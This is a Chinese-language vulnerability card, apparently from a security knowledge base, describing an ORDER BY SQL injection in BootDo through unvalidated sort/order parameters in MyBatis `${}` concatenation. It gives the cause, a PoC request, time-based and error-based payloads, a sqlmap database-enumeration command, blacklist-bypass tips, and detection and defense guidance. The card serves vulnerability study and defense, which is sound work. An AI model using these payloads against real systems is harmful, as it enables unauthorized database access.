---
id: web-generic-sqli-bootdo-sort-order-token
title: BootDo 列表接口 `${sort} ${order}` 文本拼接：Map 隐藏参数 sort/order 的 ORDER BY SQL 注入
type: scenario
domain: web
path: web/generic/sqli
technique: mybatis-sort-order-map-param-injection
tags:
- sqli
- java
- mybatis
- orderby
- map-parameter
- spring-boot
- bootdo
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V55
  verified_at: '2026-11-05T09:00:53+08:00'
  notes: 已对照原文与26张图核对：Mapper XML 多处 order by sort/order 文本拼接、Controller 用 @RequestParam Map<String,Object>、/common/dict/list?sort=1* 返回 SQL 语法错误并回显完整 SQL、sqlmap 取到库名，均与图14-18一致。原文请求携带 JSESSIONID；卡内已注明需要有效会话/部分接口可能放行。PoC 未在本机执行；frontmatter 无 sources/source_url。
url: /docs/web/generic/sqli/web-generic-sqli-bootdo-sort-order-token/
draft: false
kb_aliases:
- BootDo SQL注入
- sort 参数注入
- order by ${sort} ${order}
- Map 参数隐藏排序注入
- /common/dict/list 注入
---

## 一句话结论

BootDo 的多个 Mapper XML 在 `order by ${sort} ${order}` 中直接文本拼接排序字段与方向，而 Controller 用 `@RequestParam Map<String, Object> params` 原样接收所有查询参数；攻击者在 `/list` 接口追加默认不存在的 `sort`/`order` 参数，即可把任意 SQL 注入 `ORDER BY` 子句，原文用 `/common/dict/list?sort=1*` 触发 SQL 报错并用 sqlmap 取到数据库名。

## 原理

- BootDo 使用 Spring Boot + MyBatis；MyBatis 的 `#{}` 会预编译为 `?`，而 `${}` 是文本替换。排序字段/方向属于 SQL 标识符或关键字，无法用 `?` 绑定，代码因此写成 `order by ${sort} ${order}`。
- Mapper XML（`NotifyMapper.xml`、`CustomActivitiesMapper.xml`、`SalaryMapper.xml`、`ContentMapper.xml`、`DictMapper.xml` 等）都有该写法，说明是全局性代码模式而非单点。
- Controller 的 list 方法参数是 `@RequestParam Map<String, Object> params` 或直接接收整个参数 Map，Spring 会把 URL 中任意参数（包括文档里没有的 `sort`、`order`）放入 Map；Service 再原样传给 Mapper。
- Mapper 中 `${sort}`/`${order}` 没有任何白名单、正则或枚举限制（对比 `SortRequest` 之类的 `@Pattern` 校验），因此 `sort=1*`、`sort=1 AND (SELECT ...)` 会直接进入 SQL 语法层。
- 注入位于 `ORDER BY` 后，可用 MySQL 报错注入（`extractvalue`/`updatexml`）、时间盲注（`SLEEP`/heavy query）或布尔条件；原文用 `sort=1*` 得到完整 SQL 报错，说明注入点可被错误回显确认。
- 根因：把“排序字段”当成可信配置而非用户输入；动态 SQL 片段必须由服务端白名单映射，不能直接拼接请求参数。

## 触发条件

- 目标为 BootDo（Spring Boot + MyBatis）应用，对应 Mapper XML 使用 `order by ${sort} ${order}`。
- 目标 `/list` 接口可达；原文请求携带登录后的 `JSESSIONID`，通常需要一个有效会话（部分接口可能由 Shiro 放行，需按目标确认）。
- 接口使用 `Map<String,Object>` 接收参数，未对 `sort`/`order` 做白名单校验。
- 数据库为 MySQL（原文 sqlmap 识别为 MySQL >= 5.0；其他数据库同理）。

## 利用步骤

1. 登录目标，抓取任意 `/list` 接口请求（如 `/common/dict/list?limit=10&offset=0`）。
2. 追加 `sort` 参数并构造非法表达式（如 `sort=1*`），观察是否返回 SQL 语法错误并泄露完整 SQL。
3. 用报错/布尔/时间盲注确认可执行：`sort=1 AND (SELECT SLEEP(3))` 或 `sort=1 AND extractvalue(1,concat(0x7e,database()))`。
4. 用 sqlmap 指定注入点与 DBMS 扩大利用：`sqlmap -u "http://target/common/dict/list?limit=10&offset=0&sort=1*" --dbms=mysql --dbs`。
5. 记录报错/时间差/数据库名作为证据；验证后停止，不读取业务数据。

## PoC

报错确认：

```http
GET /common/dict/list?limit=10&offset=0&sort=1* HTTP/1.1
Host: target
Cookie: JSESSIONID=<有效会话>
X-Requested-With: XMLHttpRequest
```

响应中出现 MySQL 语法错误与完整 SQL：

```text
Error querying database. Cause: java.sql.SQLException: sql injection violation,
syntax error, error in: '... order by 1* limit ?, ?' ...
### SQL: select ... from sys_dict WHERE sort = ? ... order by 1* ...
```

sqlmap 利用：

```bash
sqlmap -u "http://target/common/dict/list?limit=10&offset=0&sort=1*" --dbms=mysql --dbs
```

## 变体与关联

- 变体：`order` 参数同样可注入（`order=desc,(select ...)`），或 `sort` 与 `order` 组合构造合法语句。
- 变体：`limit ${offset}, ${limit}`、`${column}` 等其他 `${}` 拼接点也可注入；审计时应全局搜索 `${`。
- 变体：若接口对 `sort` 做了黑名单，可尝试大小写、注释、括号、函数名混淆，或改用 `order` 参数。
- 关联：[[web-generic-sqli-mybatis-dollar-brace-injection]]（MyBatis `${}` 五类拼接点的通用原理；本卡是 Map 隐藏参数进入 ORDER BY 的具体实例）。
- 关联：[[web-generic-sqli-oa-jsp-orderby-sort-updatexml]]、[[web-generic-sqli-craft-commerce-sort-orderby-time-blind]]（排序参数注入的同类案例）。

## 检测与防御

- 防御：排序字段与方向必须走服务端白名单映射（如 `Map.of("name","name","createDate","create_date")`），只允许固定值；绝不把请求参数直接拼进 `${}`。
- 防御：Controller 使用明确的 DTO 并做参数校验，禁止 `Map<String,Object>` 全量接收；对未知参数直接丢弃。
- 防御：MyBatis 中值位置一律 `#{}`；`ORDER BY`/表名/列名使用白名单或用 `<choose>` 固定分支。
- 检测：搜索 `order by ${`、`${sort}`、`${order}`、`limit ${` 等模式；对 `sort`/`order` 参数出现函数名、括号、注释符、`SLEEP`、`extractvalue` 等特征告警。
- 检测：应用日志出现 SQL 语法错误、`sql injection violation` 关键字；数据库错误率异常；同一会话对多个 list 接口追加未知排序参数。
